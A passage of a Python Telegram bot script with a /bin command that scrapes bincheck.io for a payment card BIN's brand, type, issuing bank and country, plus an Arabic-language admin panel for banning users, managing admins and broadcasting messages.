            bot.edit_message_text(chat_id=chat_id, message_id=initial_message.message_id, text=f"An error occurred: {e}")
    else:
        pass
@bot.message_handler(commands=['bin'])
def process_bin(message):
    try:
        kg=bot.reply_to(message,f'<strong>[~] Processing Your request... </strong>',parse_mode="HTML")
        time.sleep(1)
        if '.bin' in message.text:
            P = message.text.split('.bin')[1].strip()
        elif '/bin' in message.text:
            P = message.text.split('/bin')[1].strip()

        start_time = time.time()

        meet_headers = {
            'Referer': 'https://bincheck.io/ar',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
        }

        response = requests.get(f'https://bincheck.io/ar/details/{P[:6]}', headers=meet_headers)
        soup = BeautifulSoup(response.text, 'html.parser')

        table1 = soup.find('table', class_='w-full table-auto')
        rows1 = table1.find_all('tr')

        table2 = soup.find_all('table', class_='w-full table-auto')[1]
        rows2 = table2.find_all('tr')

        for row in rows1:
            cells = row.find_all('td')
            if len(cells) == 2:
                cell1_text = cells[0].text.strip()
                cell2_text = cells[1].text.strip()
                if cell1_text == 'BIN/IIN':
                    bin_ = cell2_text
                elif cell1_text == 'العلامة التجارية للبطاقة':
                    brand = cell2_text
                elif cell1_text == 'نوع البطاقة':
                    card_type = cell2_text
                elif cell1_text == 'تصنيف البطاقة':
                    card_level = cell2_text
                elif cell1_text == 'اسم المصدر / البنك':
                    bank = cell2_text
                elif cell1_text == 'المُصدِر / هاتف البنك':
                    bank_phone = cell2_text

        for row in rows2:
            cells = row.find_all('td')
            if len(cells) == 2:
                cell1_text = cells[0].text.strip()
                cell2_text = cells[1].text.strip()
                if cell1_text == 'اسم الدولة ISO':
                    country_name = cells[1].text.strip()
                elif cell1_text == 'رمز البلد ISO A2':
                    country_iso_a2 = cell2_text
                elif cell1_text == 'ISO كود الدولة A3':
                    country_iso_a3 = cell2_text
                elif cell1_text == 'علم الدولة':
                    country_flag = cells[1].find('img')['src']
                elif cell1_text == 'عملة البلد ISO':
                    currency = cell2_text

        try:
            country = pycountry.countries.get(name=country_name)
            flag = country.flag if country else ""
        except:
            flag = ""

        end_time = time.time()
        duration = int(end_time - start_time)

        msg = f"""
𝗕𝗜𝗡 𝗟𝗼𝗼𝗸𝘂𝗽 𝗥𝗲𝘀𝘂𝗹𝘁 🔍

𝗕𝗜𝗡 ⇾ {P[:6]} 

𝗜𝗻𝗳𝗼 ⇾ {brand} - {card_type}  - {card_level}
𝐈𝐬𝐬𝐮𝐞𝐫 ⇾{bank}
𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ⇾ {country_name} {flag}
- 𝐓𝐢𝐦𝐞⇾ {duration}s
━━━━━━━━━━━━━━━━━
◆ 𝐁𝐘: @maho_s9
"""
        bot.delete_message(message.chat.id, kg.message_id)
        bot.reply_to(message, msg)
    except:
        bot.reply_to(message, f"𝙐𝙣𝙡𝙤𝙤𝙠 𝘽𝙄𝙉 𝙏𝙧𝙮 𝙖𝙣𝙤𝙩𝙝𝙚𝙧🔎")


@bot.message_handler(commands=['admin'])
def start(message):
    user_id = message.from_user.id
    username = message.from_user.username
    users = {}
    if user_id in banned_users:
        bot.send_message(user_id, "أنت محظور من استخدام هذا البوت.")
        return
    users = {}
    if user_id not in users:
        users[user_id] = {"username": username, "joined": datetime.now()}
        broadcast_list.append(user_id)
    
    if user_id in admins:
        bot.send_message(user_id, "مرحبًا بك في لوحة التحكم", reply_markup=get_admin_menu())
    else:
        bot.send_message(user_id, "مرحبًا بك في البوت!")

@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    user_id = call.from_user.id
    
    if user_id in banned_users:
        bot.send_message(user_id, "أنت محظور من استخدام هذا البوت.")
        return

    if call.data == "manage_users":
        if user_id in admins:
            bot.send_message(user_id, "إدارة المستخدمين", reply_markup=get_manage_users_menu())
    
    elif call.data == "ban_user":
        if user_id in admins:
            msg = bot.send_message(user_id, "أرسل معرف المستخدم لحظره:")
            bot.register_next_step_handler(msg, ban_user)
    
    elif call.data == "unban_user":
        if user_id in admins:
            msg = bot.send_message(user_id, "أرسل معرف المستخدم لفك الحظر عنه:")
            bot.register_next_step_handler(msg, unban_user)
    
    elif call.data == "add_admin":
        if user_id in admins:
            msg = bot.send_message(user_id, "أرسل معرف المستخدم لإضافته كأدمن:")
            bot.register_next_step_handler(msg, add_admin)
    
    elif call.data == "remove_admin":
        if user_id in admins:
            msg = bot.send_message(user_id, "أرسل معرف المستخدم لحذفه من الأدمن:")
            bot.register_next_step_handler(msg, remove_admin)

def ban_user(message):
    user_id_to_ban = int(message.text)
    banned_users.add(user_id_to_ban)
    bot.send_message(message.chat.id, f"تم حظر المستخدم: {user_id_to_ban}")

def unban_user(message):
    user_id_to_unban = int(message.text)
    banned_users.discard(user_id_to_unban)
    bot.send_message(message.chat.id, f"تم فك الحظر عن المستخدم: {user_id_to_unban}")

def add_admin(message):
    new_admin_id = int(message.text)
    admins.add(new_admin_id)
    bot.send_message(message.chat.id, f"تمت إضافة الأدمن: {new_admin_id}")

def remove_admin(message):
    admin_id_to_remove = int(message.text)
    admins.discard(admin_id_to_remove)
    bot.send_message(message.chat.id, f"تم حذف الأدمن: {admin_id_to_remove}")

def send_broadcast(message):
    broadcast_message(message.text)
    bot.send_message(message.chat.id, "تم إرسال الرسالة بنجاح!")

bot.infinity_polling()
